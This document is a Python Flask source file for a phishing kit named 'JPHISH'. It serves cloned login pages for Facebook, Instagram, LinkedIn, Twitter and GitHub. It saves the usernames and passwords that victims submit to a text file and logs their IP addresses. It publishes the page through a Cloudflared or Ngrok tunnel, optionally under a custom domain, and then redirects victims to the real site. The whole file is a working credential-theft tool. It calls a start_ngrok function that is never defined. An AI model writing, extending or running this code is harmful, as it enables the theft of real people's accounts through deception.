import os
import subprocess
import time
import sys
import platform
import shutil
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials and sessions
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Detect OS and Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Install Cloudflared (Termux + Linux/macOS)
def install_cloudflared():
    try:
        if is_termux():
            print("\n[+] Installing Cloudflared for Termux...")
            subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
        else:
            print("\n[+] Installing Cloudflared for Linux/macOS...")
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            subprocess.run(["wget", url, "-O", "cloudflared"], check=True)
            subprocess.run(["chmod", "+x", "cloudflared"], check=True)
            subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"], check=True)
        return True
    except Exception as e:
        print(f"\n[!] Failed to install Cloudflared: {e}")
        return False

# Start Cloudflared (with custom domain support)
def start_cloudflared(port=8080, custom_domain=None):
    tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
    if not tool_path:
        print("\n[!] Cloudflared not found.")
        if input("Install Cloudflared? (y/n): ").strip().lower() == "y":
            if not install_cloudflared():
                return None
            tool_path = shutil.which("cloudflared") or "/usr/local/bin/cloudflared"
        else:
            return None

    try:
        cmd = [tool_path, "tunnel", "--url", f"http://localhost:{port}"]
        if custom_domain:
            cmd.extend(["--hostname", custom_domain])
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(5)
        for line in process.stderr:
            if "trycloudflare.com" in line or (custom_domain and custom_domain in line):
                public_url = line.split("|")[-1].strip()
                print(f"\n[+] Cloudflared tunnel active! Public URL: {public_url}")
                return public_url
        return None
    except Exception as e:
        print(f"\n[!] Failed to start Cloudflared: {e}")
        return None

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. Facebook")
    print("2. Instagram")
    print("3. LinkedIn")
    print("4. Twitter")
    print("5. GitHub")
    choice = input("\nEnter choice (1-5): ").strip()

    print("\n[+] Select Tunnel Service:")
    print("1. Cloudflared (Recommended)")
    print("2. Ngrok")
    tunnel_choice = input("\nEnter choice (1/2): ").strip()

    # Custom domain (optional)
    custom_domain = None
    if tunnel_choice == "1" and input("Use custom domain? (y/n): ").strip().lower() == "y":
        custom_domain = input("Enter custom domain (e.g., login.example.com): ").strip()

    # Start tunnel
    public_url = None
    if tunnel_choice == "1":
        public_url = start_cloudflared(custom_domain=custom_domain)
    elif tunnel_choice == "2":
        ngrok_token = input("\nNgrok Auth Token: ").strip()
        public_url = start_ngrok(ngrok_token, custom_domain)
    else:
        print("\n[!] Invalid choice. Exiting.")
        sys.exit(1)

    if not public_url:
        sys.exit(1)

    # Start Flask with selected phishing page
    templates = {
        "1": "facebook.html",
        "2": "instagram.html",
        "3": "linkedin.html",
        "4": "twitter.html",
        "5": "github.html"
    }
    redirects = {
        "1": "https://facebook.com",
        "2": "https://instagram.com",
        "3": "https://linkedin.com",
        "4": "https://twitter.com",
        "5": "https://github.com"
    }

    @app.route('/')
    def home():
        return render_template(templates[choice])

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('email') or request.form.get('username')
        password = request.form.get('pass') or request.form.get('password')
        log_credentials(username, password, list(templates.values())[int(choice)-1].replace('.html', ''))
        return redirect(redirects[choice])

    print(f"\n[+] Phishing page active! Share this URL: {public_url}")

if __name__ == '__main__':
    setup()
    app.run(host='0.0.0.0', port=8080)
